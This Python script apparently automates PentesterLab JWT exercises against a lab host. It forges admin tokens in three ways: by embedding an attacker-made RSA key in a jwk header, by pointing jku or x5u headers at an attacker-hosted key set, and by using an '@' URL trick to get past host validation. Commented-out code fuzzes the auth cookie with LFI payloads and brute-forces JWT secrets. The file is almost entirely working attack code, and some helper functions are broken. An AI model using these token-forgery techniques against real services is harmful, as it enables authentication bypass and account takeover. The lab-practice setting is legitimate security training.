# This is a sample Python script.
import base64
import json

import OpenSSL
import jwt
from Crypto.PublicKey import RSA
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.hazmat.primitives.serialization import NoEncryption
from cryptography.hazmat.primitives.serialization import PrivateFormat
from cryptography.hazmat.primitives.serialization import PublicFormat


'''
Now, it doesn't work because newer version of ssh-keygen no longer uses PEM format as default key format. It have changed to RFC4716 for default key format. Thus, I have to set PEM format explicitly :

ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
cat jwtRS256.key
cat jwtRS256.key.pub

This will work

Libraries:
Crypto.PublicKey: pip install pycryptodome
jwt: pip install PyJWT[crypto]
OpenSSL: pip install PyOpenSSL
Requests: pip install requests

'''

url = "http://ptl-08d60b73-01e4d5ca.libcurl.so/"
PATH_PUBLIC_KEY = "/home/kali/keys/jwtRS256.key.pub"
PATH_PRIVATE_KEY = "/home/kali/keys/jwtRS256.key"
'''
def encrypt(payload,key,header,alg):
    jwtData = jwt.encode(payload, key, algorithm=alg, headers=header)
    print("" + str(jwtData.decode()))
    return jwtData.decode()


def sendHttpRquest():
    with open("usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt", "r") as file:
        for line in file:
            cookieValue = "auth=" + encrypt(line)
            header = {"Cookie": cookieValue}
            response = requests.get(url, headers=header)
            if response.status_code == 200:
                print("PAYLOAD: " + line)
            print(response.content)


def decrypt():
    token = "eyJhbGciOiJSUzI1NiIsImtpZCI6ImtNQkdXNFlmZkdDSng3dVg5eTJxZmVzMGdRQWtDQXlxV0JCREE5YzBZaXcifQ.YmRtaW4.Uh4H6FuYrIql4yGTJBLY1jwj_yQAMGr3j1xSw0oJSyL9otaEsmNk9GutM3jTc7GP3SldvHAReiUlzRW7grAqKWA7-95Y9YXC0U-z2v4_V06ovQ9ozLh9KhhEEUi4_p3pN6VxOJUg68_PFFxScW1g27hAlY31dai6D-zL9T3YkUWh44exuM0g1_P1fHKeRY2de-LbMFXAzaQmVC2fyZe33lQgNVFzm60cfHlw2Mzh7HPxyYzFMIDxfU9AMyH3BezxGlfOvByqX4mJpBTpGkKp3j4aBogf3jgncfqfSJ9GJSflWmny2RQgCyWQJFsxCoabNuSk1A48ZWCkDDDGnrDRCQ"
    secret = ["kMBGW4YffGCJx7uX9y2qfes0gQAkCAyqWBBDA9c0Yiw", "jwt", "insecurity", "pentesterlab", "hacking", ""]
    for passwd in secret:
        try:
            jwtdata = jwt.decode(token, passwd)
            print(jwtdata)
            print(passwd)
        except Exception:
            print("")

'''


def to_json(obj):
    return json.dumps(obj)


def getEAndNFromPublicKey(pathPublicKey):
    publicKey = {"e": None, "n": None}
    with open(pathPublicKey, "rb") as file:
        publicKey = RSA.importKey(file)
        print("e: " + str(publicKey.e))
        print("n: " + str(publicKey.n))
        # Quizas e y n deben ir codificados en base64 y URL encode
    return (publicKey.e, publicKey.n)


def getPublicCerfiticate(path):
    key = OpenSSL.crypto.PKey()
    key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
    return key

def getCetificates(key):
    priv = key.to_cryptography_key()
    pub = priv.public_key()
    return (priv, pub)

def getTextCertificates(key):
    encryptAlg=NoEncryption()
    return key.to_cryptography_key().private_bytes(Encoding.PEM,PrivateFormat.TraditionalOpenSSL,encryptAlg),key.to_cryptography_key().public_key().public_bytes(Encoding.PEM,PublicFormat.SubjectPublicKeyInfo)

def generateCertificate(key):
    cert=OpenSSL.crypto.X509()
    cert.get_subject().C = "UK"
    cert.get_subject().ST = "London"
    cert.get_subject().L = "London"
    cert.get_subject().O = "Dummy Company Ltd"
    cert.get_subject().OU = "Dummy Company Ltd"
    cert.get_subject().CN = "PentesterLab"
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(key)
    cert.sign(key, 'sha256')
    certificate=OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM,cert)
    certificate=certificate.decode("utf-8").replace("-----BEGIN CERTIFICATE-----","")\
        .replace("-----END CERTIFICATE-----","").replace("\n","")
    return certificate

def getX509(public_key):
    encryptAlg=NoEncryption()
    pem=public_key.private_bytes(Encoding.PEM,PublicFormat.SubjectPublicKeyInfo)
    pem=pem.decode("ascii").replace("-----BEGIN PUBLIC KEY-----","")
    pem=pem.replace("-----END PUBLIC KEY-----","")
    pem=pem.replace("\n","")
    return pem

def urlEncodeBase64(input):
    return base64.urlsafe_b64encode((input).to_bytes((input).bit_length() // 8 + 1, byteorder='big')).decode(
        "utf8").rstrip("=")


def jwtEncode(header, payload):
    return base64.urlsafe_b64encode(bytes(json.dumps(header), encoding="utf8")).decode("utf8").rstrip(
        "=") + "." + payload


def jwtSign(priv, input):
    return priv.sign(bytes(input, encoding="utf8"), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())


def encrypt(payload,key,header,alg):
    jwtData = jwt.encode(payload, key, algorithm=alg, headers=header)
    print("JWT Final: " + jwtData)
    return jwtData

def jwk():
    payload = "YWRtaW4"
    alg = "RS256"
    privateKEy, publicKey = getPublicCerfiticate(PATH_PUBLIC_KEY)
    n = urlEncodeBase64(publicKey.public_numbers().n)
    print("n: " + n)
    e = urlEncodeBase64(publicKey.public_numbers().e)
    print("e: " + e)
    header = {
        "alg": "RS256",
        "jwk": {
            "kty": "RSA",
            "kid": "",
            "use": "sig",
            "n": n,
            "e": e
        }
    }
    headerAndPayload = jwtEncode(header, payload)
    print("Header Payload: " + headerAndPayload)
    sign = base64.urlsafe_b64encode(jwtSign(privateKEy, headerAndPayload)).decode("utf8").rstrip("=")
    print("Sign: " + sign)
    print("final JWT: " + headerAndPayload + "." + sign)


def jku():
    payload = {"user":"admin"}
    alg = "RS256"
    key= getPublicCerfiticate(PATH_PUBLIC_KEY)
    privateKEy, publicKey = getCetificates(key)
    textPrivateKEy, textPublicKey = getTextCertificates(key)
    print("Public key: "+str(textPublicKey))
    n = urlEncodeBase64(publicKey.public_numbers().n)
    print("n: " + n)
    e = urlEncodeBase64(publicKey.public_numbers().e)
    print("e: " + e)

    json_public_key = {
            "keys": [
                {
                    "kty": "RSA",
                    "use": "sig",
                    "kid": "pentesterlab",
                    "n": n,
                    "e": e,
                    "alg": "RS256"
                }
            ]
    }
    print("Header : " + json.dumps(json_public_key))
    json_url=input("JSON URL: ")
    print("public key: "+json_url)
    header={"jku": json_url}
    encrypt(payload,privateKEy,header,alg)

def x5c():
    payload = {"user": "admin"}
    alg = "RS256"
    key = getPublicCerfiticate(PATH_PUBLIC_KEY)
    privateKEy, publicKey = getCetificates(key)
    certificate=generateCertificate(key)
    print("Cetificate: " + str(certificate))


    json_public_key = {
        "keys": [
            {
                "kty": "RSA",
                "use": "sig",
                "kid": "pentesterlab",
                "x5c": certificate,
                "alg": "RS256"
            }
        ]
    }
    print("Public certificate : " + json.dumps(json_public_key))
    json_url = input("JSON URL: ")
    print("URL public key: http://ptl-4d8428eb-4d11ccc4.libcurl.so@" + json_url)
    header = {"x5u": "http://ptl-4d8428eb-4d11ccc4.libcurl.so@"+json_url}
    encrypt(payload, privateKEy, header, alg)


if __name__ == '__main__':
    # jwk()
    #jku()
    x5c()